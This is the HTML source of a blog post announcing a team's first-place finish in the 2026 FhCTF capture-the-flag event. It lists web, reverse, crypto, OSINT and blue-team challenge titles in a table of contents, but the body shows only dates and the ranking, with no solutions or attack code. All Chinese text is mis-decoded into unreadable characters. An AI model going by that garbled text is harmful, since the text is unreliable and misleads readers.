  <!DOCTYPE html>
  <html lang="zh-TW"  
  >
  <head>
  <meta charset="utf-8">
  
  
  
  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-TW":"è¤‡è£½æˆåŠŸ (*^â–½^*)","en":"Copy successfully (*^â–½^*)"},"fail":{"zh-TW":"è¤‡è£½å¤±æ•— (ï¾ŸâŠ¿ï¾Ÿ)ï¾‚","en":"Copy failed (ï¾ŸâŠ¿ï¾Ÿ)ï¾‚"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'æœ¬éƒ¨è½æ ¼æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ¥è²æ˜å¤–ï¼Œå‡æ¡ç”¨ BY-NC-SA æˆæ¬Šå”è­°ã€‚è½‰è¼‰è«‹è¨»æ˜å‡ºè™•ï¼';window.REIMU_CONFIG.swPath = '/sw.js';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://blog.itousouta15.tw';window.REIMU_CONFIG.i18n_languages = ["en"];</script>
  <title>
    FhCTF 11401 | itouBLoGa
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic|JetBrains Mono:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic|JetBrains Mono:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
    
<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/regular.min.css" integrity="sha384-4qYppzjH8EiA+cGdaubu2vL7Rk8WGiqCSj7oRuP1uwtFWkfKNHD20lPfcrbQc8dU" crossorigin="anonymous">
<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/solid.min.css" integrity="sha384-wbMWab3UDSPm2kvIgVOn&#x2F;d9KPTecgPU1+Nb3zoQrm&#x2F;oVu0EkPL6IaKinjbwW0rum" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css" crossorigin="anonymous">

    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/brands.min.css" integrity="sha384-KTGeC2hIMzpeQakhsmzB9bZfhCD5xZZCgI1iZH6f/O457SxzlkzTQg/WXFNoi3ih" crossorigin="anonymous">
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/v5-font-face.min.css" integrity="sha384-nJ1ThfldViXoLpJ6jlKcP2beas8BMbYq26SG9Hi8cH89bZi4RZ644v7helMCqJxd" crossorigin="anonymous">
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/v4-font-face.min.css" integrity="sha384-UlkrhOIvZxJFd4MElSUp7ow6/RUeYKi/orfCZIRRiOENFuQPIAA3T3HjYfmBRhNq" crossorigin="anonymous">
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" integrity="null" crossorigin="anonymous">
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" integrity="null" crossorigin="anonymous">
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" integrity="null" crossorigin="anonymous">
    
<link rel="stylesheet" href="/css/loader.css">

    <meta name="description" content="Rank 1!!! ä½†æˆ‘åªèƒ½èªªæ‹‰å®Œäº†">
<meta property="og:type" content="article">
<meta property="og:title" content="FhCTF 11401">
<meta property="og:url" content="https://blog.itousouta15.tw/2026/01/01/undefined/">
<meta property="og:site_name" content="itouBLoGa">
<meta property="og:description" content="Rank 1!!! ä½†æˆ‘åªèƒ½èªªæ‹‰å®Œäº†">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/1.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/2.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/3.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/3.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/4.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/5.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/6.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/7.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/8.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/9.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/10.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/11.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/12.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/13.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/14.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/15.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/16.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/17.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/18.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/19.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/20.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/21.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/22.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/23.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/24.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/25.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/26.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/27.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/28.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/a.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/b.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/29.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/30.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/31.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/32.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/33.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/34.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/35.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/36.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/37.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/38.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/39.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/40.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/41.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/42.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/43.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/44.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/45.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/46.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/47.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/48.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/49.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/50.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/51.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/52.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/53.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/54.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/55.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/56.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/57.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/58.webp">
<meta property="og:image" content="https://blog.itousouta15.tw/images/FhCTF/59.webp">
<meta property="article:published_time" content="2025-12-31T16:00:00.000Z">
<meta property="article:modified_time" content="2026-02-13T12:53:24.034Z">
<meta property="article:author" content="ä¼Šè—¤è’¼å¤ª">
<meta property="article:tag" content="è³‡å®‰">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.itousouta15.tw/images/FhCTF/1.webp">
      <meta name="keywords" content="ä¼Šè—¤è’¼å¤ª, Hexo, Blog, Coding, Learning, Life">
    <link rel="alternate" href="/atom.xml" title="itouBLoGa" type="application/atom+xml">
    <link rel="shortcut icon" href="/images/favicon.ico">
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/photoswipe@5.4.4/dist/photoswipe.css" integrity="null" crossorigin="anonymous">
      
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@waline/client@2.15.8/dist/waline.css" crossorigin="anonymous">

    
<script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>

    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@reimujs/aos@0.1.0/dist/aos.css" crossorigin="anonymous">

<meta name="generator" content="Hexo 8.1.1"></head>

  <body>
      <div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi rotate">
          <img src="/images/taichi.svg" alt="loading" />
      </div>
      <div class="loading-word">è¼‰å…¥ä¸­...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var loaderEl = document.getElementById('loader');
    var startLoading = () => {
      time = Date.now();
      loaderEl.classList.remove("loading");
    }
    var hideLoader = () => {
      document.body.style.overflow = 'auto';
      loader.classList.add('loading');
    };

    var endLoading = () => {
      if (!time) {
        hideLoader();
      } else {
        if (Date.now() - time > 500) {
          time = null;
          hideLoader();
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    loaderEl.addEventListener('click', endLoading);
  </script>
<div id="copy-tooltip"></div>
<div id="heatmap-tooltip"></div>

  <div class="notification-wrapper">
    <h1>ç™¼ç¾æ–°ç‰ˆæœ¬</h1>
    <p>ç¶²ç«™å¥½åƒæœ‰æ–°å…§å®¹ï¼Œæ˜¯å¦æ›´æ–°ï¼Ÿ</p>
    <div class="notification-btn">
      <button id="notification-update-btn">æ›´æ–°</button>
      <button id="notification-close-btn">å–æ¶ˆ</button>
    </div>
  </div>

    <div id="container">
      <div id="wrap">
        <div id="header-nav">
  <nav id="main-nav">
    
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon ">
            &#xf015;
          </div>
          <a class="main-nav-link" href="/">é¦–é </a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon ">
            &#xf07c;
          </div>
          <a class="main-nav-link" href="/archives">æ­¸æª”</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon ">
            &#xf2bd;
          </div>
          <a class="main-nav-link" href="/about">é—œæ–¼</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon ">
            &#xf0c0;
          </div>
          <a class="main-nav-link" href="/friend">å‹éˆ</a>
        </span>
      
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS è¨‚é–±" target="_blank"></a>
    
    
    
  </nav>
  
    
    <nav id="i18n-nav">
      <div class="custom-dropdown">
        <div class="select-selected" id="select-selected">
          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
          <span id="selected-lang">ç¹é«”ä¸­æ–‡</span>
        </div>
        <ul class="select-items" id="select-items">
          
            <li data-value="zh-TW" class="selected">ç¹é«”ä¸­æ–‡</li>
          
            <li data-value="en" >English</li>
          
        </ul>
      </div>
      <script>
        var selectSelected = document.getElementById("select-selected");
        var selectedLang = document.getElementById("selected-lang");
        var selectItems = document.getElementById("select-items");
        var selectOptions = selectItems.querySelectorAll("li");

        selectSelected.addEventListener("click", () => {
          selectItems.classList.toggle("show");
        });

        selectOptions.forEach((item) => {
          item.addEventListener("click", () => {
            const langMap = {};
            
              langMap['zh-TW'] = '/2026/01/01/undefined/';
            
              langMap['en'] = '/en/2026/01/01/undefined/';
            
            selectedLang.textContent = item.textContent;
            selectItems.classList.remove("show");
            selectOptions.forEach((option) => {
              option.classList.remove("selected");
            });
            item.classList.add("selected");
            window.location = langMap[item.dataset.value];
          });
        });

        document.addEventListener("click", (event) => {
          if (!event.target.closest(".custom-dropdown")) {
            selectItems.classList.remove("show");
          }
        });
      </script>
    </nav>
  
</div>
<header id="header">
  
    <picture></picture>
    <img crossorigin="anonymous" fetchpriority="high" src="/images/FhCTF.png" alt="FhCTF 11401">
  
  <div id="header-outer">
    <div id="header-title">
      
        
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">FhCTF 11401</h1>
          </a>
        
      
      
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>

        <div id="content" aria-label="Page content" class="sidebar-left"  >
          <aside id="sidebar" aria-label="Sidebar">
  <div class="sidebar-wrapper-container sticky">
  <div class="sidebar-wrapper">
    <div class="sidebar-wrap" data-aos="fade-up">
          <div class="sidebar-toc-sidebar"><h3 class="toc-title">æ–‡ç« ç›®éŒ„</h3>
<div class="sidebar-toc-wrapper toc-div-class" >
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.</span> <span class="toc-text"> Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sanity-check"><span class="toc-number">1.1.</span> <span class="toc-text"> Sanity Check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#christmas-tree"><span class="toc-number">1.2.</span> <span class="toc-text"> Christmas Tree</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A7%AD%E5%AE%A2%E7%9A%84%E5%AF%86%E7%A2%BC%E9%A3%9F%E8%AD%9C"><span class="toc-number">1.3.</span> <span class="toc-text"> é§­å®¢çš„å¯†ç¢¼é£Ÿè­œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%91%E8%A9%B1%E5%A4%A7%E5%B8%AB"><span class="toc-number">1.4.</span> <span class="toc-text"> ç¬‘è©±å¤§å¸«</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E4%BA%AB%E5%9C%96%E5%BA%AB"><span class="toc-number">1.5.</span> <span class="toc-text"> åˆ†äº«åœ–åº«</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E4%BA%AB%E5%9C%96%E5%BA%AB-revenge"><span class="toc-number">1.6.</span> <span class="toc-text"> åˆ†äº«åœ–åº« Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python-compile"><span class="toc-number">1.7.</span> <span class="toc-text"> Python Compile</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#survey"><span class="toc-number">2.</span> <span class="toc-text"> Survey</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#survey-2"><span class="toc-number">2.1.</span> <span class="toc-text"> Survey</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">3.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#internal-login"><span class="toc-number">3.1.</span> <span class="toc-text"> INTERNAL LOGIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-robots"><span class="toc-number">3.2.</span> <span class="toc-text"> Web Robots</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#doors-open"><span class="toc-number">3.3.</span> <span class="toc-text"> Doors Open</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#the-visual-blind-spot"><span class="toc-number">3.4.</span> <span class="toc-text"> The Visual Blind Spot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#system-root-shell"><span class="toc-number">3.5.</span> <span class="toc-text"> SYSTEM ROOT SHELL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome-to-cybersecurity-jungle"><span class="toc-number">3.6.</span> <span class="toc-text"> Welcome to Cybersecurity Jungle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#templating-danger"><span class="toc-number">3.7.</span> <span class="toc-text"> Templating Danger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#documents"><span class="toc-number">3.8.</span> <span class="toc-text"> Documents</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log-access"><span class="toc-number">3.9.</span> <span class="toc-text"> LOG ACCESS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pathway-leak"><span class="toc-number">3.10.</span> <span class="toc-text"> Pathway-leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kid"><span class="toc-number">3.11.</span> <span class="toc-text"> KID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#something-you-put-into"><span class="toc-number">3.12.</span> <span class="toc-text"> Something You Put Into</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-number">4.</span> <span class="toc-text"> Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B0%A1%E6%98%93%E8%85%B3%E6%9C%AC%E9%96%B1%E8%AE%80%E5%99%A8"><span class="toc-number">4.1.</span> <span class="toc-text"> ç°¡æ˜“è…³æœ¬é–±è®€å™¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#obf"><span class="toc-number">4.2.</span> <span class="toc-text"> OBF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#the-lock"><span class="toc-number">4.3.</span> <span class="toc-text"> The Lock</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E5%87%BD%E6%95%B8-main-%E9%82%8F%E8%BC%AF"><span class="toc-number">4.3.1.</span> <span class="toc-text"> ä¸»å‡½æ•¸ (main) é‚è¼¯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A9%97%E8%AD%89%E5%87%BD%E6%95%B8-check_password-%E5%88%86%E6%9E%90"><span class="toc-number">4.3.2.</span> <span class="toc-text"> é©—è­‰å‡½æ•¸ (check_password) åˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%94%E7%AE%97%E6%B3%95%E9%82%84%E5%8E%9F%E8%88%87%E9%80%86%E5%90%91"><span class="toc-number">4.3.3.</span> <span class="toc-text"> æ¼”ç®—æ³•é‚„åŸèˆ‡é€†å‘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%B5%82%E7%B5%90%E6%9E%9C"><span class="toc-number">4.3.4.</span> <span class="toc-text"> æœ€çµ‚çµæœ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A3%9E%E6%8E%89%E7%9A%84%E8%A7%A3%E7%A2%BC%E5%99%A8"><span class="toc-number">4.4.</span> <span class="toc-text"> å£æ‰çš„è§£ç¢¼å™¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">5.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A0%E5%AF%86"><span class="toc-number">5.1.</span> <span class="toc-text"> å®‰å…¨çš„åŠ å¯†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encode-by-py"><span class="toc-number">5.2.</span> <span class="toc-text"> Encode By Py ğŸ˜˜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#des-lv1-%E8%80%81%E8%88%B9%E9%95%B7%E7%9A%84%E5%AF%B6%E8%97%8F"><span class="toc-number">5.3.</span> <span class="toc-text"> DES Lv.1 - è€èˆ¹é•·çš„å¯¶è—</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#des-lv2-%E5%86%8D%E6%8E%A2%E8%80%81%E8%88%B9%E9%95%B7%E7%9A%84%E5%AF%B6%E8%97%8Fwrite-up"><span class="toc-number">5.4.</span> <span class="toc-text"> DES Lv.2 â€“ å†æ¢è€èˆ¹é•·çš„å¯¶è—ï¼ˆWrite-upï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%93%A1%E7%9A%84%E5%AF%86%E7%A2%BC%E6%B4%8B%E8%94%A5"><span class="toc-number">5.5.</span> <span class="toc-text"> ç®¡ç†å“¡çš„å¯†ç¢¼æ´‹è”¥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#osint"><span class="toc-number">6.</span> <span class="toc-text"> OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#art-work"><span class="toc-number">6.1.</span> <span class="toc-text"> Art Work</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#trace-the-landmark"><span class="toc-number">6.2.</span> <span class="toc-text"> Trace the Landmark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B3%B61"><span class="toc-number">6.3.</span> <span class="toc-text"> å³¶1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#the-fh-gift"><span class="toc-number">6.4.</span> <span class="toc-text"> The FH Gift</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%95%86%E6%99%82%E9%96%93-1"><span class="toc-number">6.5.</span> <span class="toc-text"> å·¥å•†æ™‚é–“ 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%95%86%E6%99%82%E9%96%93-2"><span class="toc-number">6.6.</span> <span class="toc-text"> å·¥å•†æ™‚é–“ 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lithium-exploration"><span class="toc-number">6.7.</span> <span class="toc-text"> Lithium exploration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#srl"><span class="toc-number">6.8.</span> <span class="toc-text"> SRL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B3%B62"><span class="toc-number">6.9.</span> <span class="toc-text"> å³¶2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%82%E4%BA%AE%E7%9A%84%E5%9C%93%E9%A0%82-1"><span class="toc-number">6.10.</span> <span class="toc-text"> æ¼‚äº®çš„åœ“é ‚ 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%82%E4%BA%AE%E7%9A%84%E5%9C%93%E9%A0%82-2"><span class="toc-number">6.11.</span> <span class="toc-text"> æ¼‚äº®çš„åœ“é ‚ 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%92%E6%88%B4%E5%AE%89%E5%85%A8%E5%B8%BD%E7%9A%84%E9%A8%8E%E5%A3%AB"><span class="toc-number">6.12.</span> <span class="toc-text"> æ²’æˆ´å®‰å…¨å¸½çš„é¨å£«</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exif%E7%9A%84%E6%8B%8D%E6%94%9D%E5%BA%A7%E6%A8%99"><span class="toc-number">6.13.</span> <span class="toc-text"> EXIFçš„ã€Œæ‹æ”åº§æ¨™ã€</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blue-team"><span class="toc-number">7.</span> <span class="toc-text"> Blue team</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E8%A8%82%E5%96%AE"><span class="toc-number">7.1.</span> <span class="toc-text"> å¤§è¨‚å–®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#users-bad-day"><span class="toc-number">7.2.</span> <span class="toc-text"> ğŸ§© Userâ€™s Bad Day</span></a></li></ol></li></ol>
</div>
</div>
          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ä¼Šè—¤è’¼å¤ª" class="lazyload">
  <div class="sidebar-author-name">ä¼Šè—¤è’¼å¤ª</div>
  <div class="sidebar-description">Professional Bug Creator</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>æ–‡ç« </div>
    <div class="sidebar-state-number">4</div>
  </div>
  <div class="sidebar-state-category">
    <div>åˆ†é¡</div>
    <div class="sidebar-state-number">3</div>
  </div>
  <div class="sidebar-state-tag">
    <div>æ¨™ç±¤</div>
    <div class="sidebar-state-number">4</div>
  </div>
</div>
<div class="sidebar-social" >
    <div class="icon-email sidebar-social-icon">
      <a href=mailto:me@itousouta15.tw itemprop="url" target="_blank" aria-label="email" rel="noopener nofollow noreferrer"></a>
    </div>
    <div class="icon-github sidebar-social-icon">
      <a href=https://github.com/itousouta15 itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
    </div>
    <div class="icon-instagram sidebar-social-icon">
      <a href=https://www.instagram.com/itou.souta15 itemprop="url" target="_blank" aria-label="instagram" rel="noopener nofollow noreferrer"></a>
    </div>
    <div class="icon-discord sidebar-social-icon">
      <a href=https://discord.gg/GVhwRRVJ7F itemprop="url" target="_blank" aria-label="discord" rel="noopener nofollow noreferrer"></a>
    </div>
</div>
<div class="sidebar-menu">
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="é¦–é "></a>
          <div class="sidebar-menu-icon icon ">
                &#xf015;
          </div>
        <div class="sidebar-menu-link">é¦–é </div>
      </div>
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="æ­¸æª”"></a>
          <div class="sidebar-menu-icon icon ">
                &#xf07c;
          </div>
        <div class="sidebar-menu-link">æ­¸æª”</div>
      </div>
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="é—œæ–¼"></a>
          <div class="sidebar-menu-icon icon ">
                &#xf2bd;
          </div>
        <div class="sidebar-menu-link">é—œæ–¼</div>
      </div>
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="å‹éˆ"></a>
          <div class="sidebar-menu-icon icon ">
                &#xf0c0;
          </div>
        <div class="sidebar-menu-link">å‹éˆ</div>
      </div>
</div>
</div>
          <div class="sidebar-btn-wrapper" style="position:static">
            <div class="sidebar-toc-btn current"></div>
            <div class="sidebar-common-btn"></div>
          </div>
    </div>
  </div>
  <div class="sidebar-widget">
  </div>
  </div>
</aside>

          <section id="main" aria-label="Main content"><article id="post-FhCTF" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-inner" data-aos="fade-up">
    <div class="article-meta">
      <div class="article-date">
  <span class="article-date-link icon-calendar" data-aos="zoom-in">
    <time datetime="2025-12-31T16:00:00.000Z" itemprop="datePublished">2026-01-01</time>
    <time style="display: none;" id="post-update-time">2026-02-13</time>
  </span>
</div>

    </div>
    
    <div class="hr-line"></div>
    
    <div class="e-content article-entry" itemprop="articleBody">
        <p>Rank 1!!! ä½†æˆ‘åªèƒ½èªªæ‹‰å®Œäº†</p>
<span id="more"></span>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">2026</span> FhCTF / Team CTF</span><br><span class="line"><span class="attribute">01</span>.<span class="number">01</span> â€“ <span class="number">01</span>.<span class="number">05</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Group</span> - --------------------------é–‹æ”¾åœ˜è¨‚éº¥ç•¶å‹åº•ä¸‹ç•™è¨€+<span class="number">1</span>--------------------------</span><br><span class="line"><span class="attribute">Final</span> â€” Rank <span class="number">1</span>ï¼ˆTop <span class="number">1</span>ï¼‰</span><br></pre></td></tr></table></figure>
